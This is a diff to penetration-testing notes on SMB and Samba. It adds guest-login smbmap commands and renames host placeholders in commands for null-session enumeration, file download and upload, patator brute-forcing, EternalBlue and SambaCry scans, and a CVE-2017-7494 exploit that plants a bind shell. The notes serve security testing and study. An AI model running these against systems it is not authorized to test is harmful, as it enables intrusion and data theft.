@@ -32,7 +32,7 @@ nmap --script smb-os-discovery.nse -p 445 <HOST>
 nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 <HOST>
 ```
 
-### Null session
+### Null session & guest access
 
 A null session refers to an unauthenticated NetBIOS session.  
 A null session allows unauthenticated access to the shared files as well as a
@@ -46,7 +46,9 @@ the `enum4linux` Perl as well as the `smbmap` scripts can be used. `enum4linux`
 being outdated, `smbmap` is recommended as the go to tool.
 
 ```
-smbmap -H <HOST>
+smbmap -H <HOSTNAME | IP>
+smbmap -u "Guest" -H <HOSTNAME | IP>
+smbmap -u "Invité" -H <HOSTNAME | IP>
 enum4linux <HOST>
 ```
 
@@ -73,22 +75,22 @@ not retrieve the same information.
 
 ```
 # If no username provided, null session assumed
-smbmap [-d <DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOST> | --host-file <FILE>)  
+smbmap [-d <DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOSTNAME | IP> | --host-file <FILE>)  
 
 # nmap smb-enum-shares script will attempt to retrieve the file system path of the share
-nmap -v -sT -p 139,445 --script smb-enum-shares.nse <HOST>
-nmap -v -sU -sT -p U:137,T:139,445 --script smb-enum-shares.nse <HOST>
-nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>
-nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>
+nmap -v -sT -p 139,445 --script smb-enum-shares.nse <HOSTNAME | IP>
+nmap -v -sU -sT -p U:137,T:139,445 --script smb-enum-shares.nse <HOSTNAME | IP>
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>
 
-crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
-crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> --shares
+crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --shares
+crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -H <HASH> --shares
 
 msf > use auxiliary/scanner/smb/smb_enumshares
 
-smbclient -U "" -N -L \\<NETBIOS_NAME | IP>
+smbclient -U "" -N -L \\<HOSTNAME | IP>
 # Some Windows servers do not support IP only and require the NetBIOS name too
-smbclient -U "" -N -L \\<NETBIOS_NAME> -I <IP>
+smbclient -U "" -N -L \\<HOSTNAME> -I <IP>
 # To authenticate as USERNAME. --pw-nt-hash to specify an NT hash instead of a cleartext password
 smbclient -U <USERNAME> [--pw-nt-hash] ...
 ```
@@ -104,16 +106,16 @@ matching the search criteria.
 If no credentials are provided, a null session will be attempted.
 
 ```
-smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -R <SHARE> (-H HOST | --host-file FILE)  
-smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -F <PATTERN> (-H HOST | --host-file FILE)  
+smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -R <SHARE> (-H <HOSTNAME | IP> | --host-file <FILE>)  
+smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] -F <PATTERN> (-H <HOSTNAME | IP> | --host-file <FILE>)  
 
-nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args maxdepth=-1
-nmap -v -sT -p 139,445 <HOST> --script smb-ls --script-args share=<SHARE>,maxdepth=-1
-nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>,maxdepth=-1
-nmap -v -sT -p 139,445 <HOST> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>,maxdepth=-1
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args maxdepth=-1
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-ls --script-args share=<SHARE>,maxdepth=-1
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>,maxdepth=-1
+nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>,maxdepth=-1
 
-crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -shares <SHARE> --spider
-crackmapexec <TARGET> -d <DOMAIN> -u <USERNAME> -H <HASH> -shares <SHARE> --spider
+crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -shares <SHARE> --spider
+crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -H <HASH> -shares <SHARE> --spider
 
 msf > use auxiliary/scanner/smb/smb_enumshares
 set ShowFiles true
@@ -123,7 +125,7 @@ set SpiderShares true
 `smbmap` or `metasploit` can be used to download, upload or delete a file:
 
 ```
-smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] --download/--upload/--delete <PATH> (-H HOST | --host-file FILE)
+smbmap [-d DOMAIN] [-u USERNAME] [-p PASSWORD/HASH] --download/--upload/--delete <PATH> (-H HOSTNAME | IP | --host-file FILE)
 
 msf > use auxiliary/admin/smb/download_file
 ```
@@ -134,8 +136,7 @@ The Linux `smbclient` CLI tool can be used to interact with the a SMB or SAMBA
 share:
 
 ```
-smbclient -U "" -N "\\\\<NETBIOS_NAME>\\<SHARE>"
-smbclient -U "" -N "\\\\<IP>\\<SHARE>"
+smbclient -U "" -N "\\\\<HOSTNAME | IP>\\<SHARE>"
 
 # To authenticate as USERNAME. --pw-nt-hash to specify an NT hash instead of a cleartext password
 smbclient -U <USER> --pw-nt-hash ...
@@ -190,16 +191,16 @@ of smbmount):
 # guest for null session or specify an user with username=
 # vers=1.0 if any error arise
 
-mount -t cifs //<HOST>//<SHARE> /mnt/<FOLDER> -o rw,guest,vers=1.0
-mount -t cifs //<HOST>//<SHARE> /mnt/<FOLDER> -o rw,username=<USER>,password=<PASSWORD>,vers=1.0
+mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,guest,vers=1.0
+mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,username=<USER>,password=<PASSWORD>,vers=1.0
 ```
 
 From a Windows system, the `net` bultin can be used:
 
 ```
 # NULL session
-net use <DRIVELETTER>: \\<HOSTNAME/IP>\<SHARE> "" /user:""
-net use <DRIVELETTER>: \\<HOSTNAME/IP>\<SHARE> /user:"<DOMAIN>\<USERNAME>"
+net use <DRIVELETTER>: \\<HOSTNAME | IP>\<SHARE> "" /user:""
+net use <DRIVELETTER>: \\<HOSTNAME | IP>\<SHARE> /user:"<DOMAIN>\<USERNAME>"
 ```
 
 ###### Agent Ransack
@@ -221,7 +222,7 @@ The tool supports regex use, such as follow:
 The `patator` tool can be used to brute force credentials on the service:
 
 ```
-patator smb_login host=<HOST> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='NT_STATUS_LOGON_FAILURE'
+patator smb_login host=<HOSTNAME | IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='NT_STATUS_LOGON_FAILURE'
 ```
 
 ### Known vulnerabilities
@@ -235,7 +236,7 @@ smb-vuln-ms10-061
 smb-vuln-ms17-010 / cve-2017-7494
 smb-vuln-regsvc-dos
 
-nmap -v -p 139,445 --script=vuln <HOST | CIDR>
+nmap -v -p 139,445 --script=vuln <HOSTNAME | IP | CIDR>
 ```
 
 ###### Symlink Directory Traversal
@@ -266,11 +267,11 @@ and Petya ransomware) or CVE-2017-7494 aka SambaCry.
 
 ```
 # EternalBlue
-nmap --script smb-vuln-ms17-010.nse -p 445 <HOST | CIDR>
+nmap --script smb-vuln-ms17-010.nse -p 445 <HOSTNAME | IP | CIDR>
 
 # SambaCry
-nmap --script smb-vuln-cve-2017-7494 -p 445 <HOST | CIDR>
-nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <HOST | CIDR>
+nmap --script smb-vuln-cve-2017-7494 -p 445 <HOSTNAME | IP | CIDR>
+nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p 445 <HOSTNAME | IP | CIDR>
 ```
 
 If no share is available to unauthenticated users, the server may still be
@@ -306,7 +307,7 @@ vulnerability on Linux hosts:
 https://github.com/opsxcq/exploit-CVE-2017-7494
 
 # Usage
-exploit.py [-h] -t <TARGET> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]
+exploit.py [-h] -t <HOSTNAME | IP> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]
 
 # The libbindshell-samba.so of the repository can be used to get a bind shell on the server :
 # -e libbindshell-samba.so -r <SHARE>/libbindshell-samba.so
